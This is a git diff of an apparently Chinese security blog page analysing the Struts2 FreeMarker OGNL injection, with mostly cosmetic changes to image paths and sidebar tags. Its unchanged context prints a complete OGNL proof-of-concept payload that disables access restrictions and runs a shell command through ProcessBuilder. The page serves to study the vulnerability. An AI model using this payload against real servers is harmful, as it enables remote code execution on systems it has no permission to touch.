@@ -26,22 +26,22 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="影响版本： Struts 2.0.1 - Struts 2.3.33Struts 2.5 - Struts 2.5.10 0x01 部署又见踩坑这回漏洞主要位于struts对freemarker处理的问题  表现层技术主要有三种:jsp、freemarker、velocity   idea生成maven项目，在pom.xml中添加依赖  &lt;dependencies&gt;      &lt;dep">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
 <meta property="article:published_time" content="2018-10-09T09:36:55.000Z">
 <meta property="article:modified_time" content="2020-08-01T13:17:19.398Z">
 <meta property="article:author" content="Sariel.D">
 <meta property="article:tag" content="java">
 <meta property="article:tag" content="struts">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
@@ -511,7 +511,7 @@
   )
 </script>
 
-            <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/assets/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
@@ -589,7 +589,7 @@
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
 </li>
 <li><p>目录结构</p>
-<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/dd92b54a/15391573043244.jpg" alt></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/dd92b54a/15391573043244.jpg" alt></p>
 </li>
 </ol>
 <h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><h3 id="跟进分析"><a href="#跟进分析" class="headerlink" title="跟进分析"></a>跟进分析</h3><ol>
@@ -597,28 +597,28 @@
 <pre class=" language-xml"><code class="language-xml"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result-type</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>freemarker<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.apache.struts2.views.freemarker.FreemarkerResult<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre>
 </li>
 <li><p>新建一个进程，打印模板内容</p>
-<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/dd92b54a/15392291327345.jpg" alt></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/dd92b54a/15392291327345.jpg" alt></p>
 </li>
 <li><p>跟进process</p>
-<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/dd92b54a/15392293024253.jpg" alt></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/dd92b54a/15392293024253.jpg" alt></p>
 </li>
 <li><p>再跟进ObjectWrapper#process()，从根节点进行渲染</p>
-<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/dd92b54a/15392294225738.jpg" alt></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/dd92b54a/15392294225738.jpg" alt></p>
 </li>
 <li><p>跟进visit()，这里采用深度遍历，同时渲染节点，accept()会解析节点内容，遇到表达式会跟进处理</p>
-<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/dd92b54a/15392298241499.jpg" alt></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/dd92b54a/15392298241499.jpg" alt></p>
 </li>
 <li><p>简单跟一下accept()，如果不是自定义宏，会调用visitAndTransform对节点中的表达式进行处理</p>
-<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/dd92b54a/15392303370664.jpg" alt></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/dd92b54a/15392303370664.jpg" alt></p>
 </li>
 <li><p>跟进几层，TransformControl会在页面跳转前对参数值进行处理，</p>
-<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/dd92b54a/15392304794944.jpg" alt></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/dd92b54a/15392304794944.jpg" alt></p>
 </li>
 <li><p>findString最后会调用findValue，在这里OGNL表达式被执行</p>
 <blockquote>
 <p>org.apache.struts2.components.Component#findValue(java.lang.String, java.lang.Class)</p>
 </blockquote>
-<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/dd92b54a/15392309802810.jpg" alt></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/dd92b54a/15392309802810.jpg" alt></p>
 </li>
 </ol>
 <h3 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h3><pre class=" language-flow"><code class="language-flow">st=>start: 传入之后通过struts-default.xml进入org.apache.struts2.views.freemarker.FreemarkerResult
@@ -629,7 +629,7 @@ en=>end: 如果不是自定义宏，则进入visitAndTransform，一些列操作
 
 st->a->b->c->en</code></pre>
 <p>调用栈信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/dd92b54a/15392282074814.jpg" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/dd92b54a/15392282074814.jpg" alt></p>
 <h4 id="通过POC快速定位"><a href="#通过POC快速定位" class="headerlink" title="通过POC快速定位"></a>通过POC快速定位</h4><pre class=" language-java"><code class="language-java"><span class="token operator">%</span><span class="token punctuation">{</span><span class="token punctuation">(</span>#dm<span class="token operator">=</span><span class="token annotation punctuation">@ognl</span><span class="token punctuation">.</span>OgnlContext<span class="token annotation punctuation">@DEFAULT_MEMBER_ACCESS</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#_memberAccess<span class="token operator">?</span><span class="token punctuation">(</span>#_memberAccess<span class="token operator">=</span>#dm<span class="token punctuation">)</span><span class="token operator">:</span><span class="token punctuation">(</span><span class="token punctuation">(</span>#container<span class="token operator">=</span>#context<span class="token punctuation">[</span><span class="token string">'com.opensymphony.xwork2.ActionContext.container'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token operator">=</span>#container<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token annotation punctuation">@com</span><span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ognl<span class="token punctuation">.</span>OgnlUtil@<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token punctuation">.</span><span class="token function">getExcludedPackageNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token punctuation">.</span><span class="token function">getExcludedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#context<span class="token punctuation">.</span><span class="token function">setMemberAccess</span><span class="token punctuation">(</span>#dm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#cmd<span class="token operator">=</span><span class="token string">'/usr/bin/touch /tmp/vuln'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#iswin<span class="token operator">=</span><span class="token punctuation">(</span><span class="token annotation punctuation">@java</span><span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token annotation punctuation">@getProperty</span><span class="token punctuation">(</span><span class="token string">'os.name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'win'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#cmds<span class="token operator">=</span><span class="token punctuation">(</span>#iswin<span class="token operator">?</span><span class="token punctuation">{</span><span class="token string">'cmd.exe'</span><span class="token punctuation">,</span><span class="token string">'/c'</span><span class="token punctuation">,</span>#cmd<span class="token punctuation">}</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">,</span>#cmd<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProcessBuilder</span><span class="token punctuation">(</span>#cmds<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#p<span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#process<span class="token operator">=</span>#p<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ros<span class="token operator">=</span><span class="token punctuation">(</span><span class="token annotation punctuation">@org</span><span class="token punctuation">.</span>apache<span class="token punctuation">.</span>struts2<span class="token punctuation">.</span>ServletActionContext<span class="token annotation punctuation">@getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token annotation punctuation">@org</span><span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOUtils<span class="token annotation punctuation">@copy</span><span class="token punctuation">(</span>#process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#ros<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ros<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>
 <p>注意到调用了ProcessBuilder#start()，将断点打在ProcessBuilder类的start()方法</p>
 <blockquote>
@@ -1966,6 +1966,12 @@ st->a->b->c->en</code></pre>
         
         
         
+        
+        
+        
+        
+        
+        
     
     
     
@@ -2481,6 +2487,16 @@ st->a->b->c->en</code></pre>
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
         
+            <span class="sidebar-tag-name" data-tags="Mysql">
+                <span class="iconfont-archer">&#xe606;</span>
+                Mysql
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="RCE">
+                <span class="iconfont-archer">&#xe606;</span>
+                RCE
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="ctf">
                 <span class="iconfont-archer">&#xe606;</span>
                 ctf
@@ -2496,11 +2512,6 @@ st->a->b->c->en</code></pre>
                 随笔
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Mysql">
-                <span class="iconfont-archer">&#xe606;</span>
-                Mysql
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="内网">
                 <span class="iconfont-archer">&#xe606;</span>
                 内网
@@ -2509,6 +2520,16 @@ st->a->b->c->en</code></pre>
             <span class="sidebar-tag-name" data-tags="RedTeam">
                 <span class="iconfont-archer">&#xe606;</span>
                 RedTeam
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="代码审计">
+                <span class="iconfont-archer">&#xe606;</span>
+                代码审计
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="PHP">
+                <span class="iconfont-archer">&#xe606;</span>
+                PHP
             </span>
         
             <span class="sidebar-tag-name" data-tags="Burp suite">
@@ -2526,14 +2547,14 @@ st->a->b->c->en</code></pre>
                 extension
             </span>
         
-            <span class="sidebar-tag-name" data-tags="代码审计">
+            <span class="sidebar-tag-name" data-tags="Weblogic">
                 <span class="iconfont-archer">&#xe606;</span>
-                代码审计
+                Weblogic
             </span>
         
-            <span class="sidebar-tag-name" data-tags="PHP">
+            <span class="sidebar-tag-name" data-tags="Deserialize">
                 <span class="iconfont-archer">&#xe606;</span>
-                PHP
+                Deserialize
             </span>
         
             <span class="sidebar-tag-name" data-tags="Tomcat">
@@ -2544,21 +2565,6 @@ st->a->b->c->en</code></pre>
             <span class="sidebar-tag-name" data-tags="LFI">
                 <span class="iconfont-archer">&#xe606;</span>
                 LFI
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="RCE">
-                <span class="iconfont-archer">&#xe606;</span>
-                RCE
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Weblogic">
-                <span class="iconfont-archer">&#xe606;</span>
-                Weblogic
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Deserialize">
-                <span class="iconfont-archer">&#xe606;</span>
-                Deserialize
             </span>
         
             <span class="sidebar-tag-name" data-tags="Chrome">
@@ -2574,6 +2580,11 @@ st->a->b->c->en</code></pre>
             <span class="sidebar-tag-name" data-tags="Discuz">
                 <span class="iconfont-archer">&#xe606;</span>
                 Discuz
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CodeQL">
+                <span class="iconfont-archer">&#xe606;</span>
+                CodeQL
             </span>
         
             <span class="sidebar-tag-name" data-tags="F5">
@@ -2616,14 +2627,14 @@ st->a->b->c->en</code></pre>
                 SQLi
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Redis">
-                <span class="iconfont-archer">&#xe606;</span>
-                Redis
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="struts">
                 <span class="iconfont-archer">&#xe606;</span>
                 struts
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Redis">
+                <span class="iconfont-archer">&#xe606;</span>
+                Redis
             </span>
         
             <span class="sidebar-tag-name" data-tags="SSRF">
@@ -2636,24 +2647,19 @@ st->a->b->c->en</code></pre>
                 ThinkPHP
             </span>
         
-            <span class="sidebar-tag-name" data-tags="xss">
-                <span class="iconfont-archer">&#xe606;</span>
-                xss
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="XXE">
                 <span class="iconfont-archer">&#xe606;</span>
                 XXE
             </span>
         
+            <span class="sidebar-tag-name" data-tags="xss">
+                <span class="iconfont-archer">&#xe606;</span>
+                xss
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="OpenCV">
                 <span class="iconfont-archer">&#xe606;</span>
                 OpenCV
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="智能合约">
-                <span class="iconfont-archer">&#xe606;</span>
-                智能合约
             </span>
         
             <span class="sidebar-tag-name" data-tags="spider">
@@ -2666,14 +2672,24 @@ st->a->b->c->en</code></pre>
                 smali
             </span>
         
-            <span class="sidebar-tag-name" data-tags="hw2020">
+            <span class="sidebar-tag-name" data-tags="智能合约">
                 <span class="iconfont-archer">&#xe606;</span>
-                hw2020
+                智能合约
             </span>
         
             <span class="sidebar-tag-name" data-tags="深信服">
                 <span class="iconfont-archer">&#xe606;</span>
                 深信服
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Nday">
+                <span class="iconfont-archer">&#xe606;</span>
+                Nday
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="hw2020">
+                <span class="iconfont-archer">&#xe606;</span>
+                hw2020
             </span>
         
             <span class="sidebar-tag-name" data-tags="CAPTCHA">
@@ -2684,16 +2700,6 @@ st->a->b->c->en</code></pre>
             <span class="sidebar-tag-name" data-tags="pwn">
                 <span class="iconfont-archer">&#xe606;</span>
                 pwn
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Nday">
-                <span class="iconfont-archer">&#xe606;</span>
-                Nday
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="CodeQL">
-                <span class="iconfont-archer">&#xe606;</span>
-                CodeQL
             </span>
         
     </div>
@@ -2707,14 +2713,14 @@ st->a->b->c->en</code></pre>
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="编程">
-            <span class="iconfont-archer">&#xe60a;</span>
-            编程
-        </span>
-    
         <span class="sidebar-category-name" data-categories="代码审计">
             <span class="iconfont-archer">&#xe60a;</span>
             代码审计
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="编程">
+            <span class="iconfont-archer">&#xe60a;</span>
+            编程
         </span>
     
         <span class="sidebar-category-name" data-categories="Pentest">
@@ -2785,7 +2791,22 @@ st->a->b->c->en</code></pre>
         
         <!-- mermaid -->
         
-    <script>
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
             window.imageLazyLoadSetting = {
                 isSPA: false,
                 processImages: null,
